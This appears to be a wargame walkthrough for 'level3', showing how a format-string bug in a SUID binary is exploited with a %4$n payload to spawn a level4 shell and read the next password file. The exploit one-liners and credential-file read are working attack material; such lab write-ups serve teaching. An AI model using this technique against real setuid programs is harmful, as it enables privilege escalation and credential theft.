# level3

## 1. Connect to the VM

Use the password obtained from `level2`:

```bash
ssh level3@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

The binary is owned by `level4` and has the SUID bit set. It therefore runs
with `level4` privileges.

The important lines are:

```c
printf(buffer);

if (m == 64)
	system("/bin/sh");
```

The user controls `buffer`, and it is passed directly to `printf` as the
format string. This creates a format-string vulnerability.

The objective is to use `printf` to write the value `64` into the global
variable `m`.

## 3. Find the address of `m`

Disassemble the binary:

```bash
objdump -d -M intel level3
```

The comparison with `64` is performed here:

```asm
mov eax,ds:0x804988c
cmp eax,0x40
```

Therefore:

```text
m address = 0x0804988c
64        = 0x40
```

On a little-endian x86 machine, the address must be written as:

```text
\x8c\x98\x04\x08
```

## 4. Find the format-string index

The `%x` format reads values from the stack. Place `BBBB` at the beginning of
the input and print several stack values:

```bash
echo 'BBBB %x %x %x %x' | ./level3
```

The output is:

```text
BBBB 200 b7fd1ac0 b7ff37d0 42424242
```

`0x42` is the ASCII value of `B`, so `42424242` represents `BBBB`. These are
the first four bytes of our buffer.

It appears as the fourth value read by `printf`: the first three `%x`
specifiers read unrelated stack values, while the fourth `%x` reaches the
beginning of our buffer.

We can therefore access the first four bytes of our input with:

```text
%4$
```

## 5. Use `%n`

The `%n` format does not print anything. Instead, it writes the number of
characters already printed into an address.

With `%4$n`, `printf` uses its fourth stack value as the destination address.
We place the address of `m` in the first four bytes of the input, so `%4$n`
writes into `m`.

We need exactly 64 characters to be printed before `%4$n`:

```text
4 address bytes + 60 "A" characters = 64
```

The payload is:

```text
[address of m]["A" * 60][%4$n]
```

## 6. Exploit the binary

Run:

```bash
(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
```

`printf` prints 64 characters and `%4$n` writes `64` into `m`. The condition
becomes true and the program starts `/bin/sh`.

Verify the effective user and read the next password:

```bash
id
cat /home/user/level4/.pass
```

The same operation can be performed non-interactively:

```bash
(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; \
  echo 'cat /home/user/level4/.pass') | ./level3
```

This prints the password stored in `flag`.
